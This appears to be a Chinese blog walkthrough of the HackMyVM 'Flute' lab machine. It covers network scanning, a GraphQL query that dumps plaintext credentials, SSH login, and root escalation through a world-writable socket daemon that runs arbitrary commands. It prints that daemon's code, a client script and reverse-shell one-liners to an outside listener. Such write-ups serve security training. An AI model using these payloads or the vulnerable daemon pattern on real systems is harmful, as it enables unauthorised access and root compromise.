---
title: HackMyVm靶场之Flute
url: https://mp.weixin.qq.com/s/PY9ElttCgcgkZY4OpgKHwg
source: Doonsec's feed
date: 2026-04-02
fetch_date: 2026-04-03T04:22:52.498659
---

# HackMyVm靶场之Flute

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/8avkpGSKmqc6cIR3ichNZ4Uy1pCVA3PE51EKOFDJ2gFO2KIg7r08rQraMapIicQDOtqxLerPlv4xuuchLECgg2vMg8iaricCoIGQNXRNAB8pjzo/0?wx_fmt=jpeg)

# HackMyVm靶场之Flute

原创

MS02423
MS02423

MS02423

![]()

在小说阅读器中沉浸阅读

这个靶机打完之后，没有写wp,现在补一补

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqd1uicvWNdeaicJrBc8ULtGOY5lf1WH0ADTaQVITuVDS4C95jL789Wib6dL8SDBU2eLibAQo4qX1y0r4pWJicGwdjcC0Pwakc6Jg7Zg/640?wx_fmt=png&from=appmsg)

一.信息收集

1.靶机IP

```
nmap -sP 192.168.137.0/24
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqezRM13PcTbFEcdzhHia5V8JxFYazicSeLBRXRGypr0waKHUlXFS1r7atIzIrDslbNJicr6VEYYo34lfRIfnUTNmCY2eciaCdX0aHI/640?wx_fmt=png&from=appmsg)

靶机IP是192.168.137.23

2.开放的端口

```
nmap -p- -sV 192.168.137.23
```

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqeTHOWlc8f3mqwUKNkKc3ZnrnmicUKUrKRqkxoNnAibUUuxWM628oqUjHAJW2Wkr5luSo2BicTiazqeN4hycrDIdicJ4ozfBGmBJcJc/640?wx_fmt=png&from=appmsg)

我们可以看到开放了8888端口和22端口，所以我们的思路就是在8888端口寻找信息，然后在22端口登录即可

3.目录扫描

```
 feroxbuster -u http://192.168.137.23:8888 -w /usr/share/seclists/Discovery/Web-Content/big.txt -x txt,php,html,zip,bak
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqeboTaUE2WdY64oI3xMZzMzD99mylUM4xGgQPyR4vKvq2cwxHFmvDKkuFSemuDb30el8tZXoQncCHCxbzp176AfXTDZbCwyRGc/640?wx_fmt=png&from=appmsg)

我们可以看到没有任何的目录信息，所以目前我们的信息只有8888端口，那么我们接下来就去8888端口查看即可

二.渗透测试

1.访问IP

```
192.168.137.23:8888
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqdDchaWqMNpCKeecakQiacIB8tpkPVnang4nl4GJrEsKFGpaHFItblicF3zTtT1WJibukFXiagb8RV6jlShxVSgsKWDEUkyIKdPh8k/640?wx_fmt=png&from=appmsg)

我们可以看到是一个 Apollo Studio Sandbox（Apollo 工作室沙箱）的界面，它是 Apollo GraphQL 平台的本地开发工具。

下面是一个查询语句

```
curl --request POST \  --header 'content-type: application/json' \  --url 'http://192.168.137.23:8888/' \  --data '{"query":"query {_typename}"}'
```

这是一个标准的 GraphQL HTTP POST 请求

查询内容为 {\_typename}，是 GraphQL 的内省查询，用于获取类型名

既然是一个查询语句，我们试试能不能去查询所有的用户名和密码试试看

2.查询语法

专门查询User类型的详细结构，我们看看结构是什么，然后通过结构去查询用户名和密码

```
查询User类型的所有字段curl -X POST http://192.168.137.23:8888/ \  -H "Content-Type: application/json" \  --data '{"query":"{ __type(name: \"User\") { name kind fields { name type { name kind } } } }"}'
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqdgjVI8rDkXuoDL5x4A8AhhosiaGicAiaENICEueoWGmrCy7ickvbSP4sufLx2fUmha6sDkbGtFaoDs7SVcp2j1FzjV1zIrvsSnQmc/640?wx_fmt=png&from=appmsg)

```
{"data":{"__type":{"name":"User","kind":"OBJECT","fields":[{"name":"username","type":{"name":"String","kind":"SCALAR"}},{"name":"password","type":{"name":"String","kind":"SCALAR"}}]}}}
```

基于查询结果的分析

执行的查询成功返回了 User对象的结构定义。结果显示：

```
对象名称：User对象类型：OBJECT包含字段：username(类型: String)password(类型: String)
```

这证实了该 GraphQL API 中存储了包含用户名和密码字段的用户对象。获取所有用户名和密码的操作步骤

已知 User类型包含 username和 password字段，下一步是找到能够返回用户列表的查询入口点。根据常见的 GraphQL 设计模式

最常见的查询所有用户的字段名是 users。执行以下命令

```
curl -X POST http://192.168.137.23:8888/ \  -H "Content-Type: application/json" \  --data '{"query":"query { users { username password } }"}'
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqfngVUur7BASYlbydkaSiax64ECme5sTV1jDWHR1QJMrN4LFADQFJxAyicibjB6IY0AngUO5TfYPJDggRrnqpKOzx5P9kAbk3w5NA/640?wx_fmt=png&from=appmsg)

我们可以看到返回了2个用户名和密码

```
{"data":{"users":[{"username":"admin","password":"imtherealadmin"},{"username":"hamelin","password":"comewithmerats"}]}}
```

接下来我们就是去ssh登录即可，经过尝试我们可以通过

```
hamelin:comewithmerats
```

登录成功

3.ssh登录

```
ssh hamelin@192.168.137.23
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/8avkpGSKmqdgaz4aoVm9XCMEnKnPHjsHy5Kp6zibftFZDG80DAnib7PTnqDliaTHpOgCVVmVjgkIAUjD3QgQCAia4tibvbmevhgTIICnZDglpKlM/640?wx_fmt=png&from=appmsg)

我们可以看到是登录成功的，接下来我们就是去提权即可

然后我们一顿找在/opt/目录下发现了 ratd.py

我们去看看

```
import socketimport os
sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)socket_path = "/tmp/ratd.sock"
if os.path.exists(socket_path):    os.remove(socket_path)
sock.bind(socket_path)os.chmod(socket_path, 0o777)sock.listen(1)
print("Rat daemon running...")
while True:    conn, _ = sock.accept()    data = conn.recv(1024).decode()
    if data.startswith("RUN "):        cmd = data[4:]        os.system(cmd)        conn.send(b"OK\n")    else:        conn.send(b"Unknown command\n")
    conn.close()
```

4.提权

我们进行分析

```
位置：/opt/ratd/ratd.py运行权限：root（从ps aux输出可见）监听地址：/tmp/ratd.sock（权限777，任何用户可访问）工作原理：监听Unix域套接字/tmp/ratd.sock接收以"RUN "开头的命令通过os.system(cmd)以root权限执行命令返回"OK\n"响应存在的漏洞任意命令执行：任何本地用户（包括您当前的hamelin用户）都可以执行任意命令root权限：命令以root权限执行无需认证：套接字权限777，无需任何认证持久性：该服务随系统启动，一直运行
```

那么我们就使用它去获取root权限即可

我们测试一下，测试服务是否正常工作

```
# 创建测试脚本来与ratd交互cat > /tmp/test_ratd.py << 'EOF'import socketimport sys
def run_command(cmd):    client = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)    client.connect("/tmp/ratd.sock")    client.send(("RUN " + cmd).encode())    response = client.recv(1024).decode()    client.close()    return response
# 测试命令test_commands = [    "id > /tmp/ratd_test_id.txt",    "whoami > /tmp/ratd_test_whoami.txt",    "pwd > /tmp/ratd_test_pwd.txt",    "ls -la / > /tmp/ratd_test_ls.txt"]
for cmd in test_commands:    print(f"执行: {cmd}")    result = run_command(cmd)    print(f"响应: {result}")
# 检查输出文件import osfor f in ["/tmp/ratd_test_id.txt", "/tmp/ratd_test_whoami.txt"]:    if os.path.exists(f):        with open(f, 'r') as file:            print(f"文件 {f} 内容: {file.read().strip()}")EOF
python3 /tmp/test_ratd.py
```

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqcbSiagdy3LzxhwcnrjhjXyJesjckFc1zEHMCdwgdOjwLadaPkeTcrcDeUK6y5k1bjvgKGnQeDtc35VU8RDqLncjCuDjnHiaG05U/640?wx_fmt=png&from=appmsg)

我们可以看到是创建成功的，那么我们直接去反弹shell即可

我们直接去使用sh去反弹是不会成功的，而且这里是sh，不是bash

```
 python3 /tmp/ratd_client.py "sh -c 'sh -i >& /dev/tcp/192.168.137.102/4444 0>&1'"
```

只会返回OK

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqd5jUNjrCByXXvt7q9aKkpXvxeD0API2vTQT40DibneAIuHZAZUia3jRL9kTSp70uVu0FfUoImfaHOYvgTolwWcGaN0AtBJjWOibA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqcPEFibog7FgLbkaNvZjk1AAClFJ9mEcuLMGuCzMj9YJcNdxhONS4ylahXdwR2qWEs00f4wL7aegNOhOkA62nQ7IpF3TANp0ngI/640?wx_fmt=png&from=appmsg)

既然没有反弹成功，我们使用python去反弹试试看

```
 python3 /tmp/ratd_client.py "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.137.102\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'"
```

![](https://mmbiz.qpic.cn/mmbiz_png/8avkpGSKmqcxgWhJiaRYpABrLUsjPxC596L2xBzQ664EU7sMlgkib5Mw1fhSttvuwlptOeJWVibGOXqeDtq7ogYuAcUy6OBKtwxJ1dPsiaT8ic3g/640?wx_fmt=png&from=appmsg)

我们可以看到是反弹成功，成功获取root权限。

至此，这个靶机渗透测试完成。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/Zq0YVAlMU8SHpQfjcz0tkGWqHzoXMvjlS5HxAxBgzo6eWLDQ5Kajv8xKg0VJGNBqz5kpqTiaGBZ45crBlictY93Q/0?wx_fmt=png)

MS02423

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/Zq0YVAlMU8SHpQfjcz0tkGWqHzoXMvjlS5HxAxBgzo6eWLDQ5Kajv8xKg0VJGNBqz5kpqTiaGBZ45crBlictY93Q/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过